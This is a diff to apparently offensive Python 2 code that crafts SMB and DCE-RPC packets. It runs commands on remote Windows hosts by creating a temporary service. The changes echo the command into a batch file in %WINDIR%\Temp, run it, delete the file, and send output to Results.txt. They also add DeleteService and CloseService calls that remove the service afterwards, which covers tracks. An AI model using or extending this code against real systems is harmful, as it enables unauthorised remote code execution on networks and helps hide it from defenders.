@@ -324,6 +324,7 @@ class SMBTreeConnectData(Packet):
         BccComplete    = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
         self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]
 
+
 class SMBNTCreateData(Packet):
     fields = OrderedDict([
         ("Wordcount",     "\x18"),
@@ -352,7 +353,6 @@ class SMBNTCreateData(Packet):
         Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
         self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
         self.fields["Bcc"] = struct.pack("<h",len(Data1))
-
 class SMBReadData(Packet):
     fields = OrderedDict([
         ("Wordcount",     "\x0a"),
@@ -574,13 +574,12 @@ class SMBDCESVCCTLCreateService(Packet):
 
         File = "%WINDIR%\\Temp\\"+self.fields["FileName"]
         WinTmpPath = "%WINDIR%\\Temp\\Results.txt"
-        CleanService = "sc delete "+self.fields["ServiceName"]+"^&"#Start by deleting the service..then run the cmd.
-        FinalCMD = CleanService+"del /F /Q "+File+"^&"+self.fields["BinCMD"]+" ^>"+WinTmpPath+" >"+File
-        #That is: delete service we just ran, delete the bat file (it's loaded in memory, no pb), echo original cmd into random .bat file, run .bat file.
+        FinalCMD = "del /F /Q "+File+"^&"+self.fields["BinCMD"]+" ^>"+WinTmpPath+" >"+File
+        #That is: echo cmd into random .bat file, run .bat file, delete the bat file (it's loaded in memory).
         self.fields["FileName"] = ""#Reset it.
         self.fields["BinPathName"] = "%COMSPEC% /C echo "#make sure to escape "&" when using echo.
         self.fields["BinCMD"] = FinalCMD
-        self.fields["BintoEnd"] = "& %COMSPEC% /C "+File
+        self.fields["BintoEnd"] = "& %COMSPEC% /C "+File+" &exit"#make sure to exit when done.
         BinDataLen = str(self.fields["BinPathName"])+str(self.fields["BinCMD"])+str(self.fields["BintoEnd"])
 
         ## Calculate first
@@ -621,6 +620,17 @@ class SMBDCESVCCTLStartService(Packet):
         ("MaxCount",             "\x00\x00\x00\x00\x00\x00\x00\x00"),
     ])
 
+class SMBDCESVCCTLDeleteService(Packet):
+    fields = OrderedDict([
+        ("ContextHandle",        ""),
+    ])
+
+class SMBDCESVCCTLCloseService(Packet):
+    fields = OrderedDict([
+        ("ContextHandle",        ""),
+    ])
+
+
 class OpenAndX(Packet):
     fields = OrderedDict([
         ("Wordcount",             "\x0f"),
@@ -638,12 +648,11 @@ class OpenAndX(Packet):
         ("Reserved2",             "\x00\x00\x00\x00"),
         ("Bcc",                   "\x0b\x00"),
         ("Terminator",            ""),
-        ("File",                  "\\hola.txt"),
-        ("FileNull",              "\x00"),#00 00
+        ("File",                  "\\"),
+        ("FileNull",              "\x00"),
 
     ])
     def calculate(self):
-        #self.fields["File"] = self.fields["File"].encode('utf-16le')
         self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Terminator"])+str(self.fields["File"])+str(self.fields["FileNull"])))
 
 class ReadRequest(Packet):
@@ -662,7 +671,7 @@ class ReadRequestAndX(Packet):
         ("Wordcount",             "\x0C"),
         ("AndXCommand",           "\xff"),
         ("Reserved",              "\x00"),
-        ("AndXOffset",            "\xde\xde"),#
+        ("AndXOffset",            "\xde\xde"),
         ("FID",                   "\x02\x40"),
         ("Offset",                "\x00\x00\x00\x00"),
         ("MaxCountLow",           "\xf0\xff"),
@@ -849,8 +858,49 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
                             s.send(buffer1)
                             data = s.recv(2048)
 
+                            ## DCE/RPC SVCCTLDeleteService.
+                            if data[8:10] == "\x25\x00":
+                                if data[len(data)-4:] == "\x05\x00\x00\x00":
+                                    print "[+] Failed to start the service.\n"
+                                    return False
+                                head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                                w = SMBDCESVCCTLDeleteService(ContextHandle=ContextHandler)
+                                x = SMBDCEPacketData(Opnum="\x02\x00",Data=w)
+                                x.calculate()
+                                t = SMBTransDCERPC(FID=f,Data=x)
+                                t.calculate()
+                                packet0 = str(head)+str(t)
+                                buffer1 = longueur(packet0)+packet0
+                                s.send(buffer1)
+                                data = s.recv(2048)
+
+                                ## DCE/RPC SVCCTLCloseService
+                                if data[8:10] == "\x25\x00":
+                                    if data[len(data)-4:] == "\x05\x00\x00\x00":
+                                        print "[+] Failed to delete the service.\n"
+                                        return False
+                                    head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                                    w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandler)
+                                    x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
+                                    x.calculate()
+                                    t = SMBTransDCERPC(FID=f,Data=x)
+                                    t.calculate()
+                                    packet0 = str(head)+str(t)
+                                    buffer1 = longueur(packet0)+packet0
+                                    s.send(buffer1)
+                                    data = s.recv(2048)
+
+                                    ##Close FID Request
+                                    if data[8:10] == "\x25\x00":
+                                       head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+                                       t = CloseRequest(FID = f)
+                                       packet1 = str(head)+str(t)
+                                       buffer1 = longueur(packet1)+packet1  
+                                       s.send(buffer1)
+                                       data = s.recv(2048)
+
     ##Tree connect c$
-    if data[8:10] == "\x25\x00":
+    if data[8:10] == "\x04\x00":
 
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print "[+] Failed to start the service.\n"
@@ -935,5 +985,6 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
        s.send(buffer1)
        data = s.recv(2048)
        return data
+
 
 
